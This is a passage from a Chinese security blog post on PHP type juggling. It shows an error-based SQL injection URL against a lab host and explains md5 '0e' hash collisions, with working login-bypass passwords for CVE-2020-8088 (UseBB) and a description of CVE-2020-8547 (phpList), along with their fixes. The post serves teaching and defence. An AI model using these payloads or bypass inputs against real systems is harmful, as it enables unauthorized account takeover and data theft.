+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.247.131&#x2F;in_array&#x2F;index.php?id&#x3D;1 and updatexml(1,make_set(3,0x7e,(select TABLE_NAME from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database() limit 0,1)),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/20.png" alt="20"></p>
+<p>但是这里也还是无法获取到字段信息，找不到一个视图能代替<code>information_schema.COLUMNS</code>视图，绕来绕去还是要进行无列名注入。</p>
+<p>本来本题的重点是<code>in_array()</code>函数中存在的漏洞，没想到跑这么远，学到更多的是sql注入方面的技巧……</p>
+<h2 id="2-md5碰撞"><a href="#2-md5碰撞" class="headerlink" title="2. md5碰撞"></a>2. md5碰撞</h2><h3 id="2-1-漏洞原理"><a href="#2-1-漏洞原理" class="headerlink" title="2.1 漏洞原理"></a>2.1 漏洞原理</h3><p>这个漏洞是世界上最好的语言php的特性导致的。</p>
+<p>php在处理哈希字符串时，会利用<code>!=</code>或<code>==</code>来对哈希值进行比较，此时php会把每一个以<code>0e</code>开头的哈希值都解释为<code>0</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ php -r <span class="string">"var_dump('0e768261251903820937390661668547' == '0')"</span>;</span><br><span class="line">Command line code:<span class="number">1</span>:</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>
+
+<p>现在的网站一般都是将密码进行加密，并将加密后的结果存到数据库中，然后在登陆的时候取出来进行验证，所以如果数据库中有用户的密码的哈希值是<code>oe</code>开头的话，那么攻击者就可以用这个用户的身份进行登录。</p>
+<h3 id="2-2-漏洞实例-CVE-2020-8088"><a href="#2-2-漏洞实例-CVE-2020-8088" class="headerlink" title="2.2 漏洞实例 CVE-2020-8088"></a>2.2 漏洞实例 CVE-2020-8088</h3><h5 id="2-2-1-漏洞描述："><a href="#2-2-1-漏洞描述：" class="headerlink" title="2.2.1 漏洞描述："></a>2.2.1 漏洞描述：</h5><blockquote>
+<p>panel_login.php in UseBB 1.0.12 allows type juggling for login bypass because != is used instead of !== for password hashes, which mishandles hashes that begin with <strong>0e</strong> followed by exclusively numerical characters. </p>
+</blockquote>
+<p>这是UseBB 1.0.12版本中存在的登录漏洞，</p>
+<h5 id="2-2-2-漏洞利用"><a href="#2-2-2-漏洞利用" class="headerlink" title="2.2.2 漏洞利用"></a>2.2.2 漏洞利用</h5><p>在安装的时候注册管理员账号用的是下面这个密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: s878926199a</span><br></pre></td></tr></table></figure>
+
+<p>然后用新的密码进行登录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: s155964671a</span><br></pre></td></tr></table></figure>
+
+<p>成功登录管理员账号：</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/24.png" alt="24"></p>
+<h5 id="2-2-3-漏洞成因"><a href="#2-2-3-漏洞成因" class="headerlink" title="2.2.3 漏洞成因"></a>2.2.3 漏洞成因</h5><p>漏洞关键代码在<code>sources/panel_login.php</code>文件中</p>
+<p>第66行和第67行是进行sql查询，根据用户名<code>$_POST[&#39;user&#39;]</code>从数据库中取出对应的用户信息。</p>
+<p><code>$userdata[&#39;passwd&#39;]</code>中就是md5加密后的用户密码，然后在第73行将用户登录时input的<code>$_POST[&#39;passwd&#39;]</code>密码进行md5加密后与从数据库里取出的密码进行比较，用的是<code>!=</code>，属于弱比较。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/26.png" alt="26"></p>
+<p>可以看到我们存储在数据库中的密码是<code>0e545993274517709034328855841020</code>（明文是<code>s878926199a</code>），登录时用的密码是<code>s155964671a</code>，对应的md5值为<code>0e342768416822451524974117254469</code>。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/25.png" alt="25"></p>
+<p>前面已经说过，在进行弱类型比较时，php会认为这两个值相等</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ php -r <span class="string">"var_dump(md5('s155964671a') == md5('s878926199a'));"</span></span><br><span class="line">Command line code:<span class="number">1</span>:</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>
+
+<p>所以接着程序会进入第125行，密码验证已经通过，接下来会执行后续登录操作。</p>
+<h5 id="2-2-4-修复方案"><a href="#2-2-4-修复方案" class="headerlink" title="2.2.4 修复方案"></a>2.2.4 修复方案</h5><p>这个cms早在2014年就停止维护了，官方是不会再修复这个漏洞了，但我们知道修复这个漏洞很简单，只要把第73行的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !$userdata[<span class="string">'id'</span>] || md5(stripslashes($_POST[<span class="string">'passwd'</span>])) != $userdata[<span class="string">'passwd'</span>] )</span><br></pre></td></tr></table></figure>
+
+<p>换成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !$userdata[<span class="string">'id'</span>] || md5(stripslashes($_POST[<span class="string">'passwd'</span>])) !== $userdata[<span class="string">'passwd'</span>] )</span><br></pre></td></tr></table></figure>
+
+<p>即可。</p>
+<h3 id="2-3-漏洞实例-CVE-2020-8547"><a href="#2-3-漏洞实例-CVE-2020-8547" class="headerlink" title="2.3 漏洞实例 CVE-2020-8547"></a>2.3 漏洞实例 CVE-2020-8547</h3><h5 id="2-3-1-漏洞描述："><a href="#2-3-1-漏洞描述：" class="headerlink" title="2.3.1 漏洞描述："></a>2.3.1 漏洞描述：</h5><blockquote>
+<p>phpList 3.5.0 allows type juggling for admin login bypass because == is used instead of === for password hashes, which mishandles hashes that begin with 0e followed by exclusively numerical characters </p>
+</blockquote>
+<h5 id="2-3-2-漏洞成因"><a href="#2-3-2-漏洞成因" class="headerlink" title="2.3.2 漏洞成因"></a>2.3.2 漏洞成因</h5><p>漏洞点就在<code>public_html/lists/admin/phpListAdminAuthentication.php</code>文件<code>validateLogin</code>函数的第49行：</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/28.png" alt="28"></p>
+<p>这个漏洞和上一个漏洞的成因一样，都是根据用户名从数据库中取出hash加密后的密码，然后将用户登录时的密码也进行hash加密，然后将这两个密码进行比较，问题就是这里第49行采取的是弱类型比较，所以当用户加密后的密码是<code>0e</code>开头的话，就会导致hash值碰撞。</p>
+<h5 id="2-3-3-官方修复"><a href="#2-3-3-官方修复" class="headerlink" title="2.3.3 官方修复"></a>2.3.3 官方修复</h5><p>这个漏洞官方已经修复了。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/27.png" alt="27"></p>
+<p>官方的修复就是将<code>==</code>号改成了强类型比较符号<code>===</code>。</p>
+<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><ol>
+<li><a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">https://www.jianshu.com/p/6eba3370cfab</a> </li>
+<li><a href="https://xz.aliyun.com/t/2160" target="_blank" rel="noopener">https://xz.aliyun.com/t/2160</a></li>
+<li><a href="https://xz.aliyun.com/t/1586/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1586/</a> </li>
+<li><a href="https://xavibel.com/2020/01/22/usebb-forum-php-type-juggling-vulnerability/" target="_blank" rel="noopener">https://xavibel.com/2020/01/22/usebb-forum-php-type-juggling-vulnerability/</a> </li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/">https://bantttian.github.io/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/06/07/%5BCISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4%5D-Laravel1/">CISCN2019 总决赛 Day1 Web4-Laravel1</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
